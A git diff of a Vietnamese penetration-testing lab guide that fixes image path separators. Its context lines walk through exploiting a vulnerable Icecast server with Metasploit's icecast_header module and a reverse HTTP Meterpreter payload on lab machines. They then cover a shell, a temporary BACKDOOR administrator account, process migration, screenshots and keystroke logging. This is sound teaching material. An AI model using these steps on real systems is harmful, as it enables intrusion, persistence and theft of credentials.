@@ -490,7 +490,7 @@ Bạn sẽ thực hiện bài thực hành này hoàn toàn trên hệ thống c
 
 **Bước 4:** Tương tác với Meterpreter đang chạy bên trong tiến trình Icecast của máy bị xâm nhập.
 
-![alt text](IMG\LAB2\LAB2.2\image.png)
+![alt text](IMG/LAB2/LAB2.2/image.png)
 
 ## Thiết lập phòng thí nghiệm
 
@@ -524,13 +524,13 @@ Lưu ý rằng dấu nhắc lệnh của bạn hiện là dấu nhắc bảng đ
 show exploits
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-1.png)
+![alt text](IMG/LAB2/LAB2.2/image-1.png)
 
 Bạn có thể thấy có hơn 2.200 lỗ hổng bảo mật trong Metasploit!
 
 Chúng ta sẽ khai thác lỗ hổng Icecast trên Windows. Hãy tìm kiếm lỗ hổng đó.
 
-![alt text](IMG\LAB2\LAB2.2\image-2.png)
+![alt text](IMG/LAB2/LAB2.2/image-2.png)
 
 Bạn sẽ thấy một lỗ hổng bảo mật dành cho Windows có tên là icecast_header, với xếp hạng "great".
 
@@ -540,7 +540,7 @@ Bây giờ chúng ta sẽ chọn lỗ hổng. Chúng ta sẽ sử dụng lỗ h�
 use exploit/windows/http/icecast_header
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-3.png)
+![alt text](IMG/LAB2/LAB2.2/image-3.png)
 
 Lưu ý rằng lời nhắc của chúng ta đã thay đổi và hiện bao gồm tên của lỗ hổng mà chúng ta đã chọn. Ngoài ra, bạn sẽ thấy rằng một payload đã được chọn sẵn cho chúng ta. Hãy sử dụng một payload Meterpreter khác thực hiện kết nối HTTP ngược (thay vì TCP thông thường) trở lại kẻ tấn công sau khi nó đang chạy bên trong tiến trình dễ bị tổn thương.
 
@@ -550,11 +550,11 @@ Lưu ý rằng lời nhắc của chúng ta đã thay đổi và hiện bao gồ
 set PAYLOAD windows/meterpreter/reverse_http
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-4.png)
+![alt text](IMG/LAB2/LAB2.2/image-4.png)
 
 Tiếp theo, chúng ta hãy xem xét các tùy chọn liên quan đến lỗ hổng này:
 
-![alt text](IMG\LAB2\LAB2.2\image-5.png)
+![alt text](IMG/LAB2/LAB2.2/image-5.png)
 
 Tùy chọn đầu tiên chúng ta sẽ thiết lập là RHOSTS. Đây sẽ là địa chỉ IP mà chúng ta muốn Metasploit tấn công. Chúng ta nên nhập địa chỉ IP của máy tính Windows đang chạy dịch vụ Icecast dễ bị tổn thương. Sử dụng `Ethernet0` địa chỉ IP, không phải `tun0` địa chỉ IP. Địa chỉ bạn đang tìm kiếm KHÔNG bắt đầu bằng `10.254.25X.X`.
 
@@ -566,7 +566,7 @@ msf6 > set RHOSTS 10.130.10.25
 RHOSTS => 10.130.10.25
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-6.png)
+![alt text](IMG/LAB2/LAB2.2/image-6.png)
 
 Đặt giá trị `LHOST` thành địa chỉ IP của `eth0` giao diện hệ thống Linux của bạn.
 
@@ -576,7 +576,7 @@ msf6 > set LHOST eth0
 
 Metasploit đã được cấu hình xong. Hãy cùng xem lại cấu hình Metasploit của chúng ta bằng lệnh `show options`.
 
-![alt text](IMG\LAB2\LAB2.2\image-7.png)
+![alt text](IMG/LAB2/LAB2.2/image-7.png)
 
 Chúng tôi gần như đã sẵn sàng cho cuộc tấn công, nhưng trước tiên chúng tôi cần phải hoàn tất một số công việc chuẩn bị.
 
@@ -584,13 +584,13 @@ Bây giờ chúng ta cần khởi động máy chủ Icecast trên máy tính Wi
 
 Nhấp chuột phải vào biểu tượng Icecast trên màn hình máy tính và chọn "Chạy với quyền quản trị viên" .
 
-![alt text](IMG\LAB2\LAB2.2\image-8.png)
+![alt text](IMG/LAB2/LAB2.2/image-8.png)
 
 Khi giao diện người dùng (GUI) của Icecast xuất hiện, hãy nhấp vào nút Bắt đầu máy chủ . Trạng thái máy chủ sẽ chuyển sang màu xanh lục và hiển thị "Running".
 
-![alt text](IMG\LAB2\LAB2.2\image-9.png)
+![alt text](IMG/LAB2/LAB2.2/image-9.png)
 
-![alt text](IMG\LAB2\LAB2.2\image-10.png)
+![alt text](IMG/LAB2/LAB2.2/image-10.png)
 
 Để đảm bảo Windows có thể kết nối đến máy Linux của chúng ta với shell Meterpreter đảo ngược mà không bị hạn chế, chúng ta cũng cần đảm bảo Windows có thể ping Linux. Trên máy Windows của bạn, tại cmd.exe , hãy chạy lệnh sau:
 
@@ -598,7 +598,7 @@ Khi giao diện người dùng (GUI) của Icecast xuất hiện, hãy nhấp v�
 ping 10.130.10.128
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-11.png)
+![alt text](IMG/LAB2/LAB2.2/image-11.png)
 
 Nếu lệnh ping thành công, chúng ta có thể tiếp tục. Nếu không, hãy kiểm tra lại cài đặt mạng của bạn.
 
@@ -608,7 +608,7 @@ Hãy bắt đầu cuộc tấn công! Trên máy Linux của bạn, tại dấu 
 
 Nếu cuộc tấn công thành công, bạn sẽ thấy một thông báo trên Linux có nội dung "Meterpreter session 1 opened".
 
-![alt text](IMG\LAB2\LAB2.2\image-13.png)
+![alt text](IMG/LAB2/LAB2.2/image-13.png)
 
 ### 3. Sessions
 
@@ -625,7 +625,7 @@ background
 
 Tại `msf6` dấu nhắc lệnh, chúng ta hiện đang tương tác với Metasploit, chứ không phải với Meterpreter trên máy chủ bị xâm nhập. Hãy cùng xem xét `sessions`...
 
-![alt text](IMG\LAB2\LAB2.2\image-14.png)
+![alt text](IMG/LAB2/LAB2.2/image-14.png)
 
 Trong trường hợp này, bạn có thể thấy phiên làm việc là `1`. Phiên của bạn có thể khác.
 
@@ -636,7 +636,7 @@ sessions -n inecast_win10 -i 1
 sessions
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-15.png)
+![alt text](IMG/LAB2/LAB2.2/image-15.png)
 
 Bây giờ chúng ta hãy cùng tương tác trong phiên.
 
@@ -655,7 +655,7 @@ Sau khi chạy Meterpreter, chúng ta hãy cùng khám phá hệ thống một c
 sysinfo
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-16.png)
+![alt text](IMG/LAB2/LAB2.2/image-16.png)
 
 Điều này cho chúng ta biết loại hệ điều hành của máy tính bị xâm nhập.
 
@@ -665,7 +665,7 @@ Bây giờ, hãy xác định tên người dùng của chúng ta trên ô nạn
 getuid
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-17.png)
+![alt text](IMG/LAB2/LAB2.2/image-17.png)
 
 Chúng ta cần sử dụng cùng tên người dùng mà bạn đã dùng để khởi chạy máy chủ Icecast vì chúng ta đang chạy từ bên trong không gian bộ nhớ của nó.
 
@@ -673,9 +673,9 @@ Chúng ta cần sử dụng cùng tên người dùng mà bạn đã dùng để
 ps
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-18.png)
+![alt text](IMG/LAB2/LAB2.2/image-18.png)
 
-![alt text](IMG\LAB2\LAB2.2\image-19.png)
+![alt text](IMG/LAB2/LAB2.2/image-19.png)
 
 Hãy cùng xem xét các tùy chọn mà chúng ta có với pslệnh này bằng cách xem phần trợ giúp.
 
@@ -683,11 +683,11 @@ Hãy cùng xem xét các tùy chọn mà chúng ta có với pslệnh này bằn
 ps -h
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-20.png)
+![alt text](IMG/LAB2/LAB2.2/image-20.png)
 
 Hãy tìm tiến trình Icecast2 của chúng ta bằng cách sử dụng `-S`.
 
-![alt text](IMG\LAB2\LAB2.2\image-21.png)
+![alt text](IMG/LAB2/LAB2.2/image-21.png)
 
 Hãy tìm kỹ tiến trình có tên [tên tiến trình] `Icecast2.exe`. Ghi lại số ID của tiến trình đó tại đây:
 
@@ -715,7 +715,7 @@ Tiếp theo, hãy cùng tìm hiểu xem chúng ta đang ở đâu trong cấu tr
 pwd
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-22.png)
+![alt text](IMG/LAB2/LAB2.2/image-22.png)
 
 Bây giờ chúng ta hãy lấy danh sách thư mục:
 
@@ -723,7 +723,7 @@ Bây giờ chúng ta hãy lấy danh sách thư mục:
 ls  
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-23.png)
+![alt text](IMG/LAB2/LAB2.2/image-23.png)
 
 ### 5. Shell
 
@@ -733,7 +733,7 @@ ls
 shell
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-24.png)
+![alt text](IMG/LAB2/LAB2.2/image-24.png)
 
 Giờ đây bạn có thể nhập bất kỳ lệnh nào bạn muốn vào cửa sổ cmd.exe.
 
@@ -743,7 +743,7 @@ Chạy `hostname`.
 hostname
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-25.png)
+![alt text](IMG/LAB2/LAB2.2/image-25.png)
 
 Chạy `ipconfig`.
 
@@ -751,7 +751,7 @@ Chạy `ipconfig`.
 ipconfig
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-26.png)
+![alt text](IMG/LAB2/LAB2.2/image-26.png)
 
 Chạy `dir`:
 
@@ -759,7 +759,7 @@ Chạy `dir`:
 dir
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-27.png)
+![alt text](IMG/LAB2/LAB2.2/image-27.png)
 
 Bây giờ chúng ta hãy xem xét những người dùng trên hệ thống.
 
@@ -767,7 +767,7 @@ Bây giờ chúng ta hãy xem xét những người dùng trên hệ thống.
 net user
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-28.png)
+![alt text](IMG/LAB2/LAB2.2/image-28.png)
 
 Tạo một tài khoản cửa sau có tên là `BACKDOOR`.
 
@@ -775,7 +775,7 @@ Tạo một tài khoản cửa sau có tên là `BACKDOOR`.
 net user BACKDOOR Password1 /add
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-29.png)
+![alt text](IMG/LAB2/LAB2.2/image-29.png)
 
 Lệnh trên tạo một người dùng với mật khẩu là Password1.
 
@@ -785,7 +785,7 @@ Bây giờ chúng ta hãy xác nhận xem người dùng có tồn tại hay kh�
 net user BACKDOOR
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-30.png)
+![alt text](IMG/LAB2/LAB2.2/image-30.png)
 
 Tài khoản BACKDOOR mới là một tài khoản thông thường. Sẽ hữu ích hơn nếu nó có quyền quản trị. Hãy cấp quyền quản trị cho tài khoản này.
 
@@ -793,7 +793,7 @@ Tài khoản BACKDOOR mới là một tài khoản thông thường. Sẽ hữu 
 net localgroup administrators BACKDOOR /add
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-31.png)
+![alt text](IMG/LAB2/LAB2.2/image-31.png)
 
 Bây giờ, hãy xem danh sách thành viên của nhóm quản trị viên để xác nhận xem tài khoản cửa sau có phải là quản trị viên hay không.
 
@@ -801,7 +801,7 @@ Bây giờ, hãy xem danh sách thành viên của nhóm quản trị viên đ�
 net localgroup administrators
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-32.png)
+![alt text](IMG/LAB2/LAB2.2/image-32.png)
 
 Như chúng ta thấy, tài khoản mới của chúng ta là tài khoản quản trị viên!
 
@@ -811,19 +811,19 @@ Hãy xóa tài khoản này.
 net user BACKDOOR /del
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-33.png)
+![alt text](IMG/LAB2/LAB2.2/image-33.png)
 
 Chúng ta có thể xác nhận việc xóa bằng cách chạy `net user` lại lệnh. Vì lý do tiết kiệm không gian, kết quả đầu ra không được đưa vào đây.
 
 Để thoát khỏi cửa sổ dòng lệnh, chỉ cần gõ `exit`, và bạn sẽ quay lại dấu nhắc lệnh `meterpreter >`:
 
-![alt text](IMG\LAB2\LAB2.2\image-34.png)
+![alt text](IMG/LAB2/LAB2.2/image-34.png)
 
 ### 6. Các tính năng khác của Meterpreter
 
 Tiếp theo, chụp ảnh màn hình hệ thống bị khai thác và lưu lại với tên `/tmp/screen.jpg`:
 
-![alt text](IMG\LAB2\LAB2.2\image-35.png)
+![alt text](IMG/LAB2/LAB2.2/image-35.png)
 
 Meterpreter sẽ chụp ảnh màn hình, quá trình này có thể mất vài giây.
 
@@ -833,7 +833,7 @@ Tiếp theo, khởi chạy trình duyệt Firefox trong máy ảo Linux của b�
 file:///tmp/screen.jpg
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-36.png)
+![alt text](IMG/LAB2/LAB2.2/image-36.png)
 
 Bây giờ chúng ta sẽ di chuyển DLL Meterpreter trên máy bị khai thác từ một tiến trình này sang tiến trình khác. Chúng ta sẽ chuyển từ tiến trình `Icecast2.exe` sang tiến trình `explorer.exe` trên máy Windows của mình. Chúng ta sử dụng Explorer vì nó sẽ tiếp tục chạy miễn là người dùng vẫn đăng nhập.
 
@@ -849,7 +849,7 @@ Bây giờ, hãy lấy danh sách các tiến trình để tìm ID tiến trình
 ps -S explorer.exe
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-37.png)
+![alt text](IMG/LAB2/LAB2.2/image-37.png)
 
 Chúng ta có thể nhảy đến tiến trình explorer.exe bằng ID tiến trình, hoặc chúng ta có thể chỉ định tên bằng -Ntùy chọn.
 
@@ -859,7 +859,7 @@ Tiếp theo, để bắt đầu quá trình đó, chúng ta sử dụng lệnh `
 migrate -N explorer.exe
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-38.png)
+![alt text](IMG/LAB2/LAB2.2/image-38.png)
 
 > Nếu quá trình di chuyển thất bại (nhấp để mở rộng)
 > Nếu quá trình chuyển đổi của bạn thất bại (và điều này rất có thể xảy ra), bạn sẽ phải thiết lập lại phiên Meterpreter. Trước tiên, hãy tắt phiên hiện tại bằng cách gõ lệnh `exit`. Sau đó, đảm bảo Icecast đang chạy và chỉ cần gõ lại lệnh `run`.
@@ -876,11 +876,11 @@ Khởi chạy Notepad trong máy ảo Windows của bạn (không phải thông 
 
 Quay lại máy ảo Linux và phiên meterpreter của bạn rồi chạy lệnh đó `keyscan_start`.
 
-![alt text](IMG\LAB2\LAB2.2\image-39.png)
+![alt text](IMG/LAB2/LAB2.2/image-39.png)
 
 Tiếp theo, trong Windows, hãy nhập một vài đoạn văn bản vào Notepad. Viết một ghi chú về mật khẩu của bạn, ví dụ như `my password is TungDvan dep trai`.
 
-![alt text](IMG\LAB2\LAB2.2\image-40.png)
+![alt text](IMG/LAB2/LAB2.2/image-40.png)
 
 Bây giờ hãy quay lại Meterpreter và xuất các thao tác gõ phím đã thu được ra màn hình.
 
@@ -888,7 +888,7 @@ Bây giờ hãy quay lại Meterpreter và xuất các thao tác gõ phím đã 
 keyscan_dump
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-41.png)
+![alt text](IMG/LAB2/LAB2.2/image-41.png)
 
 Sau đó hãy dừng phần mềm ghi lại thao tác gõ phím:
 
@@ -896,7 +896,7 @@ Sau đó hãy dừng phần mềm ghi lại thao tác gõ phím:
 keyscan_stop
 ```
 
-![alt text](IMG\LAB2\LAB2.2\image-42.png)
+![alt text](IMG/LAB2/LAB2.2/image-42.png)
 
 ```bash
 exit
